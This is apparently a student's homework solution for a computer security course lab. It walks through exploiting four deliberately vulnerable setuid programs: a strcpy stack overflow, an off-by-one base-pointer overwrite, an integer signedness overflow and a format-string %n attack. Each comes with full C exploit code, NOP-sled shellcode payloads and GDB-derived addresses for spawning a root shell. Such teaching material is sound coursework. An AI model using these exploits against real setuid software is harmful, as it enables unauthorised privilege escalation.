# COM-402 Homework 1 Solution
- [COM-402 Homework 1 Solution](#com-402-homework-1-solution)
  - [Setuid Bit](#setuid-bit)
  - [Sploit 1](#sploit-1)
    - [Understanding the vulnerability](#understanding-the-vulnerability)
    - [Exploiting the vulnerability](#exploiting-the-vulnerability)
  - [Sploit2](#sploit2)
    - [Understanding the vulnerability](#understanding-the-vulnerability-1)
      - [Base Pointer](#base-pointer)
      - [Tricking the Stack Pointer](#tricking-the-stack-pointer)
    - [Exploiting the vulnerability](#exploiting-the-vulnerability-1)
  - [Sploit 3](#sploit-3)
    - [Understanding the vulnerability](#understanding-the-vulnerability-2)
      - [Choosing the size of our string](#choosing-the-size-of-our-string)
      - [Finding the value of `count`](#finding-the-value-of-count)
    - [Exploiting the vulnerability](#exploiting-the-vulnerability-2)
  - [Sploit 4](#sploit-4)
    - [Understanding the vulnerability](#understanding-the-vulnerability-3)
  - [The %n specifier](#the-n-specifier)
    - [Exploiting the vulnerability](#exploiting-the-vulnerability-3)

The goal of the exercises is to "manipulate" the programs `target1`,`target2`,`target3` and `target4` in order to make them spawn a shell. This may seem a bit as a useless hack at first. However, if a given program is running with superuser privileges, then spawning a shell as a superuser may have devastating consequences.

## Setuid Bit

- A program that has its setuid permission bit set will inherit the permissions of the owner when run
  - For example if an executable was created by the superuser and the setuid bit is set, then even if the program is executed by a underprivileged user, the program will run as the superuser.
- This is useful for certain programs such as `passwd`, which enable any user on the machine to change its password given the old password.
  - The program needs access to the file `etc/shadow` in order to check the old password and set a new one which is only accessible by the superuser.
  - However, any user should be able to change their passwords without extra privileges, therefore the program should run as `root` even if it is executed by a normal user.

## Sploit 1

### Understanding the vulnerability

- In order to exploit the first target, the first step is to read the source code available in the file `target1.c`

- With some basic understanding of C we can see that the program behaves in the following way :

  1. The program expects one argument which will be interpreted as a character array/string
  2. The program will then call the function `foo` using as argument the provided string and allocate a buffer of length 240 bytes
  3. The bar function will then be called with both the buffer and provided string passed as reference
  4. The program copies the contents of the string into the buffer using the built-in C function `strcpy`

  Seems innocent ?

- By typing in a terminal `man strcpy` ,  a description of the function's behavior is displayed, mentioning the following:

  ```
  char *strcpy(char *dest, const char *src);

  Description:
  The strcpy() function copies the string pointed to by src, including the terminating null byte ('\0'), to the buffer pointed to by dest. The strings may not overlap, and the destination string dest must be large enough to receive the copy. Beware of buffer overruns! (See BUGS.)
  ```

  As we see here it is described that the programmer has to make sure that the destination buffer is large enough to receive the source string. This is because the `strcpy` function does not check this itself. But what would happen if the `src` string is longer than the `dst` container ?

- Unfortunately the `strcpy` will continue to copy the rest of the remaining string in the memory "adjacent" to the `dst` buffer until it encounters a null terminating byte in the `src` string... then how can we exploit this behavior ?

- In order to understand what we can do with this, lets take a look at the state of the program stack (within the frame of the `foo` function) before the provided string is copied into the buffer:

  | Stack Contents          | Memory Addresses       |
  | ----------------------- | ---------------------- |
  | ....                    | high addresses         |
  | argument of  `foo`      | address of `buf` + 248 |
  | return address of `foo` | address of `buf` + 244 |
  | saved base pointer      | address of `buf` + 240 |
  | last 4 bytes of `buf`   | address of `buf` + 236 |
  | ...                     |                        |
  | first 4 bytes of `buf`  | address of `buf`       |
  | ...                     | low addresses          |


  - After returning from function `foo`, the instruction pointer (IP) will take the value of the return address which points to the next instruction after the call to `foo` in the `main` function.
  - if we provide a string longer than 240 bytes to the program, then the contents of the stack located above the buffer `buf` will be overwritten
  - Therefore we can overwrite the return address and manipulate the program to jump to an instruction located at an address of our choice.
  - What if we tricked the program to jump to an instruction which spawns a shell ?

### Exploiting the vulnerability

From the insight provided above, the idea would be to trick the program into jumping to an instruction which spawns a shell and to do so we need to perform the following:

1. Construct the encoding of the assembly instruction sequence representing the code

```c
char *name[2];
name[0] = "/bin/sh";
name[1] = NULL;
execve(name[0], name, NULL);
```

​ To do so we can either compile this code or we can simply use the provided shellcode in `shellcode.h`

2. Next we need to make this instruction sequence accessible in the vulnerable target program. The simplest way to do so is to include the shellcode in the string provided as an argument to the program. (the shellcode length is of 45 bytes so this can easily fit in the buffer `buf`). The provided string would have the following structure:

   | Byte indexes | 0 - 198                 | 199-243   | 244-247                   |
   | ------------ | ----------------------- | --------- | ------------------------- |
   | **Contents** | dummy values (eg : 'A') | shellcode | address of the shell code |

   To determine the indexes/structure we used the fact that that the return address is located 244 bytes after the start of the buffer, and that the shellcode is 45 bytes long.

3. The next step is to figure out the value of the address (i.e. the address pointing at byte index 199) pointing to the shellcode. To do so we will have to use the debugger _gdb_.

   Nevertheless, one trick will make this easier for us: the `NOP` assembly language instruction (short for _no operation_) is an instruction which does nothing. In other words if the program reads this instruction it will pass on to the next one (IP + 1). The `NOP` instruction encoding takes 1 byte and has the value `0x90`. Translated into a C string we get:

   ```c
   char nop[] = "\x90";
   ```

   If we use this value as dummy values in our string, then we can set as a return address any address in the range of the buffer as the program will execute all NOP instructions followed by the shellcode instruction. Therefore our provided string would now be:

   | Byte indexes | 0 - 198 | 199-243   | 244-247                   |
   | ------------ | ------- | --------- | ------------------------- |
   | **Contents** | "\\x90"  | shellcode | address of the shell code |



#### Finding the address in GDB

   In order to find the correct address, we start by implementing the exploit code (without knowing the address) the following way:

   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <unistd.h>
   #include "shellcode.h"

   #define TARGET "target1"
   #define NOP 0x90

   int main(void)
   {
     char *args[3];
     char *env[1];
     char jump_addr[] = "AAAA";
     args[1] = malloc(250);

     int i = 0;
     while(i < 199){
      args[1][i] = NOP;
      i = i+1;
     }
     strcat(args[1],shellcode);
     strcat(args[1],jump_addr);

     args[0] = TARGET;
     args[2] = NULL;
     env[0] = NULL;

     if (0 > execve(TARGET, args, env))
       fprintf(stderr, "execve failed.\n");

     return 0;
   }
   ```

   Next we run gdb with our incomplete exploit as explained in the handout:

   ```bash
   gdb -e sploit1 -s target1
   ```

   We issue the command `catch exec` to tell gdb to break as we enter the target program and run the program with `run`

   After issuing both commands the program will have halted at the start of the execution of `target1` , to find our jump address we set a breakpoint at line 8 of `target1.c` right after the execution of the `strcpy` function, as we will be able to visualize the contents of the buffer and addresses. To set the breakpoint we type in the command `break 8` and then continue execution with `continue`.

   Now to visualize the stack we run the command `x/20x $sp`, this will print out the contents of the 20 first words (4 bytes each) in hexadecimal from the top of the stack and should display the following:

   ```bash
   0xbfffc70: 0xffffeb60  0x00007fff  0xffffeef7  0x00007fff
   0xbfffc80: 0xffffec60  0x00007fff  0x55554835  0x00005555
   0xbfffc90: 0x3345ee40  0x00000000  0xffffed68  0x00007fff
   0xbfffca0: 0x90909090  0x90909090  0x90909090  0x90909090
   0xbfffcb0: 0x90909090  0x90909090  0x90909090  0x90909090
   ```

   Here we can see the contents of the start of the buffer filled with `0x90` NOP instructions. Therefore we can use the address `0xbfffca0` to overwrite the return address. To do so we change the line of code in `sploit1.c`

   ```c
   char jump_addr[] = "AAAA"
   ```

   to

   ```c
   char jump_addr[] = "\xa0\xfc\xff\xbf"
   ```

   Now if run `./sploit1` in the provided virtual machine, then we should be able to spawn a bash shell :)

## Sploit2

### Understanding the vulnerability

To understand how to exploit the program `target2.c` we start as usual by inspecting the source code. Here the program is similar however the programmer decided to avoid to use the insecure `strcpy` function and implemented his own version that performs a length check to avoid buffer overflows:

```c
void nstrcpy(char *out, int outl, char *in)
{
  int i, len;

  len = strlen(in);
  if (len > outl)
    len = outl;

  for (i = 0; i <= len; i++)
    out[i] = in[i];
}
```

However if we look at the code close we can see that the programmer made a mistake and wrote `<=` instead of `<` in the for loop condition. This means that we can overflow the buffer from one byte... but this is not enough for us to reach the return address as in the previous target, then how can we exploit this anyways ? To answer this question we first need to understand how behavior of the stack/base pointer upon exiting functions.

#### Base Pointer

The base pointer is a main register referred to as `$ebp`(the stack pointer is itself referred to as `$esp`). Upon entering a function the base pointer value is pushed on the stack and then set to the value of the stack pointer with the following instructions:

```assembly

push ebp; // push the ebp register value on the stack
mov ebp esp; // set the ebp register to esp
sub esp, N; // allocate bytes on the stack for local variables (eg the buffer)
```

This sequence of instructions is known as the _function prologue_. The _function epilogue_ refers to the sequence of instruction that handles the return from a function to the calling function, which typically reverses the actions of the function prologue the following way:

```assembly
mov esp, ebp
pop ebp
ret
```

In the above sequence, the following happens:

1. The stack pointer is set to the value currently saved in the base pointer register.
2. The previously saved base pointer value (The one pushed on the stack in the _function prologue_ and now pointed by the stack pointer) is popped from the stack and saved in the base pointer register.
3. The `ret` instruction sets the instruction pointer (`$eip`) to the value stored on stack, more specifically, the return address stored right before the base pointer.

For more information on the function prologue/epilogue and pointer registers, please check the following links:

 [https://en.wikipedia.org/wiki/Function_prologue]

[https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm]

#### Tricking the Stack Pointer

Before returning from the `bar` function, the stack will have the following structure (_start_ refers to the address at the start of the buffer `buf` as our point of reference):

| Stack Contents                 | Memory Addresses |
| ------------------------------ | ---------------- |
| `foo` arg `argv`               | _start + 260_    |
| `foo` return address           | _start + 256_    |
| `foo` saved `$ebp` (`ebp_foo`) | _start + 252_    |
| `bar` arg `arg`                | _start + 248_    |
| `bar` return address           | _start + 244_    |
| `bar` saved `$ebp` (`ebp_bar`) | _start + 240_    |
| last 4 bytes of `buf`          | _start + 236_    |
| ...                            | ....             |
| first 4 bytes of `buf`         | _start_          |
| ....                           |                  |

Note that at this point the base pointer register will hold the value _start+240_ which is the address of the previous base pointer (saved when entering the `bar` function) on the stack.

When exiting the `bar` function in a normal/benign execution, the following will happen:

1. The stack pointer will take the value set in the base pointer register. that is _start + 240_.
2. `ebp_bar` is popped from the stack and saved in the base pointer register.
3.  The `bar` function returns and the execution continues at the instructions located at the return address stored on the stack at _start + 248_ (`bar` return address).

Now the `foo` function exits and the following happens:

1. The stack pointer takes the value set in the base pointer register (`ebp_bar`) which corresponds to the address _start + 252_.
2. `ebp_foo` is popped from the stack and saved in the base pointer register
3. The `foo` function returns and the execution continues at the instructions located at the return address stored on the stack at _start + 256_ (`foo` return address = `ebp_bar` + 4).

Now we know the following:

- Due to the programmer's mistake, we can modify the last byte of the saved base pointer value `ebp_bar` stored at _start + 240_.
- After returning from the `foo` function, the execution will continue at the address stored at `ebp_bar` + 4.

Therefore to exploit this vulnerability we will construct our payload in the following way:

| Byte indexes | 0 - 190    | 191-235   | 236-239                   | 240              |
| ------------ | ---------- | --------- | ------------------------- | ---------------- |
| **Contents** | "\\x90"/NOP | shellcode | address of the shell code | overwriting byte |


The value of the overwriting byte will have to be chosen such that the new `ebp_bar` is equal to the address pointing to the buffer's 232th index. (236 -4). As a consequence, the program will continue the execution at the address of the shell code when returning from the `foo` function.

### Exploiting the vulnerability

Now that we know the structure of our shellcode, we still need to find the values for the shellcode address as well as the value of the overwriting byte. To do so, we first construct a dummy payload of 240 bytes, where the last four bytes are equal to "AAAA", this will help us localize where the saved base pointer with value `ebp_bar` is stored when running the code in gdb. Therefore we construct our dummy exploit the following way:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "target2"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  char jump_addr[] = "AAAA";
  args[1] = malloc(240);

  int i = 0;
  while(i < 191){
    args[1][i] = NOP;
    i = i+1;
  }

  strcat(args[1],shellcode);
  strcat(args[1],jump_addr);

  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
```

Now in the VM, we start gdb in the same fashion as exercise 1:

```bash
gdb -e sploit2 -s target2
# in GDB
catch exec
run
```

This time we break at the end of the `bar` function right after the `nstrcpy` execution. To do so we run the command:

```bash
disassemble bar
```

This will show us the instructions addresses of the function. To break at the end of the function we break at the address of the `leave` instruction with the command:

```bash
break *0x080484a6 # might differ on other machines
```

and then continue execution with the command `continue`. At the breakpoint we print out our buffer by issuing the command `x/80x $sp`.  By now the contents of `buf` can be visualized : a series of `0x90` NOP instruction followed by the bytes of the shellcode and the dummy address `0x41414141` = `AAAA`.

As in the first exercise, by looking at the memory addresses of the stack, we choose an address pointing to the series of NOP instruction to replace `AAAA` . In our case, we choose the address `0xbffffd40`.

Now we still need the find the value of the overwriting byte. To do so we need to find the address where the placeholder values `0x41414141` are located. In our case the line of the output containing the placeholder contains the following values:


| Stack Addresses | `0xbffffd70`         | `0xbffffd74`       | `0xbffffd78` | `0xbffffd7c`            |
| --------------- | -------------------- | ------------------ | ------------ | ----------------------- |
| **Values**      | `0x68732f6e`         | `0x41414141`       | `0xbffffd00` | `0x080484be`            |
| __Description__ | last shellcode bytes | placeholder `AAAA` | `ebp_bar`    | return address of `bar` |

As we can see, our shellcode address will be located at the stack address `0xbffffd74` which means that the modified `ebp_bar` should have value `0xbffffd70` (= `0xbffffd74` - 4). Since `ebp_bar` is originally equal to `0xbffffd00`, the last byte needs to be changed to `0x70`.

Now that we have all the addresses, we modify our payload the following way: (the comments show the changes)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "target2"
#define NOP 0x90
// The overwriting byte
#define LAST_BYTE 0x70

int main(void)
{
  char *args[3];
  char *env[1];
  // address to the shellcode
  char jump_addr[] = "\x40\xfd\xff\xbf";
  args[1] = malloc(241);

  int i = 0;
  while(i < 191){
    args[1][i] = NOP;
    i = i+1;
  }

  strcat(args[1],shellcode);
  strcat(args[1],jump_addr);
  // add the last bytes
  args[1][240] = LAST_BYTE;
  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
```

now if we run `./sploit2` a bash shell should have spawned, cheers.

## Sploit 3

### Understanding the vulnerability

To start we proceed as usual and review the source code of `target3.c`. As we can see the program expects as an argument a decimal number encoded in ASCII in the 10 first bytes followed by a comma and a list of `widget_t` . The decimal number is interpreted as the number of struct `widget_t` contained in the list.

The programmer was cautious and hence defined a constant `MAX_WIDGET` in order to set an upper bound on the number of widgets that will be copied into the buffer `buf`. However, in the `main` function the programmer converts the provided decimal number to an `int` type without performing any checks. This value is then converted to a `size_t` type when provided to the `memcpy` function. To understand how this can be exploited lets take a look at how these types are encoded on a 32-bit machine:

- An `int` represents a signed integer and encoded using the two's complement encoding on 32 bits (see [https://en.wikipedia.org/wiki/Two%27s_complement](https://en.wikipedia.org/wiki/Two's_complement)). Therefore when the binary's most significant bit is set to one, the binary value encodes a negative integer.
- A `size_t` represents an unsigned integer encoded on 32 bits which can  represent values up to 2³²-1.
- Converting a negative `int` to a `size_t` will  yield a value between 2³¹ and 2³²-1.

With this insight we can deduce the following:

- if we provide a decimal value for `count` between 2³¹ and 2³²-1, then `count` will be understood by the program as a negative value in the `foo` function and the `if` condition at line 17 will pass.
- the program will convert `count` to a `size_t` type  when calling the `memcpy` function and multiply this value by 20.

Therefore if we choose the right decimal value before the comma, we can trick the `memcpy` function to copy an arbitrary number of bytes into the buffer `buf`. However, we must ensure that when converted to a `size_t` and multiplied by 20 this value is not too large, since this can already cause the program to crash during the execution of `memcpy`. Therefore we must choose an appropriate size that is large enough to overflow the buffer and overwrite the return address but small enough to prevent the program from crashing before the return of the `foo` function.

#### Choosing the size of our string

To choose the size of our overflowing buffer, we note that choosing too large of size will likely yield a segmentation fault during the execution of the `memcpy` function preventing us from spawning our shell since the program will crash before returning from the `foo` function. Since the return address will be located 4 bytes after the end of the buffer `buf` and a `widget_t` is of size 20 bytes, we can choose a size of 4820, as if we provided an extra widget.
It is important to notice that the chosen value only refers to the string that will be copied into the buffer. As a consequence, the count will have to start after the ',' character, which acts as a separator between the number of widgets and the values themselves.

#### Finding the value of `count`

In order to make the `memcpy` function copy 4820 bytes, we need to ensure that `count` satisfies the following equation:

`count * 20  = 4820 (mod 2^(32))`

which we can simplify to :

`count = 241 (mod 2^(32)) `

Now since `count` needs to be in the range [2³¹,2³²-1], we can set `count` as 2³¹ + 241 = 2147483889 which also satisfies the above equation.

### Exploiting the vulnerability

With the insights provided above, the idea will be to provide the vulnerable program with the following payload for the function foo (does not need to be exactly 4820 bytes):

| Byte indexes | 0-4758 | 4759-4803 | 4804 - 4807               | 4808-4819                        |
| ------------ | ------ | --------- | ------------------------- | -------------------------------- |
| **Contents** |  NOP   | shellcode | address of the shell code | dummy values (eg. series of "A") |


Considering the input string for the `target3` program requires a count of widgets to copy (that, as stated, we are replacing with a "trick" value), the following payload will have to be provided as an argument:


| Byte indexes | 0 - 9        | 10   | 11-4769 | 4770-4814 | 4815 - 4818               | 4819-4830                        |
| ------------ | ------------ | ---- | ------- | --------- | ------------------------- | -------------------------------- |
| **Contents** | `2147483889` | `,`  | NOP     | shellcode | address of the shell code | dummy values (eg. series of "A") |


As usual, we open up _gdb_ and find a suitable address for the overwriting return address. This can be easily done by running the exploit with a dummy jump address (e.g.: "AAAA"), then checking at what address the `buf` variable is stored.

Once this has been done, the following code successfully exploits the vulnerability, logging us in as root.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "target3"
#define NOP 0x90
#define MAGIC_NUMBER 241
#define STRING_SIZE 4820
#define BUF_SIZE 4800

#include <math.h>

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = (char*) malloc(STRING_SIZE * sizeof (char));
  if (args[1] == NULL) {
    fprintf(stderr, "Malloc failed.\n");
    return 1;
  }
  int i = 0;
  char ret_addr[] = "\xd8\xd8\xff\xbf";

  //magic number
  size_t trick_size = ((size_t) pow(2, 31)) + MAGIC_NUMBER;

  //nops
  int n_nops = BUF_SIZE + 4 - strlen(shellcode);
  char* nop_string = (char*) malloc((n_nops + 1) * sizeof (char));
  if (nop_string == NULL) {
    fprintf(stderr, "Malloc failed.\n");
    return 1;
  }
  for (i = 0; i < n_nops; i++) {
    nop_string[i] = NOP;
  }
  nop_string[i] = '\0';

  //getting all together
  sprintf(args[1], "%u,", trick_size);
  strcat(args[1], nop_string);
  strcat(args[1], shellcode);
  strcat(args[1], ret_addr);

  for (i = strlen(args[1]); i < STRING_SIZE; i++)
    args[1][i] = 'A';

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  free(nop_string);
  free(args[1]);

  return 0;
}
```

## Sploit 4

### Understanding the vulnerability

In order to perform our attack, we first need to take a look at the source code of `target4.c`', and try to understand if it contains any vulnerability that we may exploit.

This time, the code appears quite different from the ones we observed in the previous exercises. The function `foo` receives as an argument a buffer `arg`, that is then copied to a local buffer `buf` using the library function `snprintf()`. In this case, the programmer was wise in using `snprintf()`, rather than `sprintf()`: the former provides the advantage of enforcing a control on the number of copied bytes, thus preventing buffer overflow attacks.

Since, as stated, the program does not present any buffer overflow vulnerability, we must think of something else in order to execute our shellcode and take control of the system. Upon further analysis, we can observe that `snprintf()` is a format function, therefore potentially vulnerable to *Format String* attacks. Such kind of attacks is based on the unsafe use of functions such as `printf()`, that take a format string as a parameter.

In order to understand the vulnerabilities caused by some uses of format strings, we first need to have clear the way Format Functions, such as `printf()`, operate in C.
When a function call such as `printf("I am %d years old.", age)` is performed:
1) The address of the format string is pushed onto the stack;
2) The values of the variables (only `age` in this case) are pushed onto the stack from left to right
Subsequently, the format string is read character by character from left to right, and corresponding values are read in order from the stack whenever the '%' symbol is met.

Now we may wonder: what happens if the format string contains one or more '%' specifiers, but no corresponding variable is given as an argument? In this case, the function will still behave in the same way, thus reading from the stack a number of bytes based on the specified parameter. With this in mind, imagining we have full control of a format string (e.g.: `printf(argv[1])`) we can think about exploiting format string vulnerabilities in various ways:

1) We might crash the program, by providing a format string with an arbitrary number of `%s` specifiers, such as `"%s%s%s%s"`. In this case, the function will interpret values on the stack as addresses, and, for each of those, print contained values up until a '\0' value is found. If the stack contains a value that is not an address, however, the function will not be able to dereference it, and the program will crash.
2) A more interesting kind of attack, that will serve as a basic yet fundamental tool to build our final exploit, consists in reading values from the stack. By providing a format string with an arbitrary number of `%08x` specifiers, such as `"%08x %08x %08x %08x"`, we can read that many parameters from the stack, displaying them on screen as 8-digit 0-prefixed hex numbers.

All that we have seen so far is certainly very useful; however, on its own, it does not provide any feasible way to hijack the control flow of the program and execute our shellcode. For this purpose, we must introduce the `%n` specifier.

## The %n specifier

Unlike many other specifiers, that allow to print the content or address of a variable on a string, `%n` writes the number of bytes that have been written thus far at the address specified by the corresponding pointer. We will now provide a simple yet effective example: the function call `printf("123%n", &char_written)` will write 3 on the char_written variable, assuming no character has been printed prior.

In addition to the simple `%n`, `%hn` and `%hhn` also exist. The purpose of these two parameters is to write a 2-bytes and 1-byte value respectively, rather than the standard 4-byte one.

Finally, it is useful to know a trick to manipulate the number of written characters, without actively writing as many. This consists into inserting dummy padding values in specifiers such as `%$dummy_valuex`: when this happens, the number of written values will be increased by the provided dummy value.

### Exploiting the vulnerability

Now that we have the final piece of the puzzle, we just have to put everything together and come up with an effective strategy to use `%n` to overwrite the return address of the function `foo`.

The key idea is to push onto the stack the address that we want to overwrite (the one in which the return address is stored). In order to do this, we provide it as an argument to the `snprintf()` function. As we have seen, we can then do some trial and error to identify at which point of the stack the provided address is located, and overwrite the value contained in that address (i.e.: the return address) with the number of characters we have written so far, that must match the address of the first byte of our shellcode.

In order to build our payload with more insight, we can start with the following code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "target4"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = "AAAA%08x%08x%08x%08x%08x"
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
```

We then run _gdb_ in the usual way, catching the exec and inserting a breakpoint after the execution of the `snprintf()` in the `foo` function.
By printing the address and value of the buf variable, we can notice that:
1) The content of buf is "AAAA", followed by 24 zeros and `41414141`: from this, we can infer that fourth parameter read from the stack corresponds to the first word of the `buf` variable (the previous 3 parameters were zeros).
2) The `buf` variable is located at the address `0xbffffc98`
3) As a consequence, being 404 bytes beyond the first byte of the `buf` variable, the return address is located at the address `0xbffffe2c`

Based on this, we can notice that it is easier to split the huge address in two parts, writing the higher and lower bytes separately using `%hn`. As a consequence, both a second address (`0xbffffe2e`, which is `0xbffffe2c` + 2, as we want the 2 MSB of the first address to become the 2 LSB of the second one) and an additional `%$dummy_numberx` parameter must be added, in order to "establish" the number of written bytes, thus deciding the value written by the second `%hn`. Finally, 4 random bytes of padding must be inserted between the two addresses, as the function will read them as the parameters corresponding to the `%$dummy_numberx` specifier.

Based on what has been previously stated, the following payload will have to be provided as an argument:

|   Byte indexes  |       0-3      |      4-7    |        8-11        |                    12-56                  |                     58-end                    |
| --------------- | -------------- | ----------- | ------------------ | ----------------------------------------- | --------------------------------------------- |
|    **Values**   |  `0xbffffe2c`  |     JUNK    |    `0xbffffe2e`    |                 shellcode                 |        `%64617x%x%x``%hn``"%50011x"``%hn`     |
| __Description__ | address of ret | dummy value | address of ret + 2 | address of the first byte is `0xbffffca4` | two couples of n_bytes - %hn to overwrite ret |


In order to understand the values we are using as dummies, we must note that we want to write:
1) `0xfca4` (decimal 64676) in the two LSB
2) `0xbfff` (decimal 49151) in the two MSB

At the beginning, we have written 57 bytes (addresses, junk-padding and shellcode). We must also read three values in order to have the next one being the address we put in the stack. As a result, only adding padding to one value: 64676 - 57 - 2 (%x counts as one byte) = 64617. The same reasoning can be done for the MSB.

With all of this in mind, the following code can be built to exploit the format string vulnerability, logging us in as root:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "target4"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = (char*) malloc(80);

  if (args[1] == NULL) {
    fprintf(stderr, "Error in malloc.");
    return 1;
  }

  int i;
  char ret_location[] = "\x2c\xfe\xff\xbf";
  char ret_location2[] = "\x2e\xfe\xff\xbf";

  strcat(args[1], ret_location);
  strcat(args[1], "JUNK");
  strcat(args[1], ret_location2);
  strcat(args[1], shellcode);
  strcat(args[1], "%64617x%x%x");
  strcat(args[1], "%hn");
  strcat(args[1], "%50011x");
  strcat(args[1], "%hn");
  strcat(args[1], "\0");

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  free(args[1]);

  return 0;
}
```
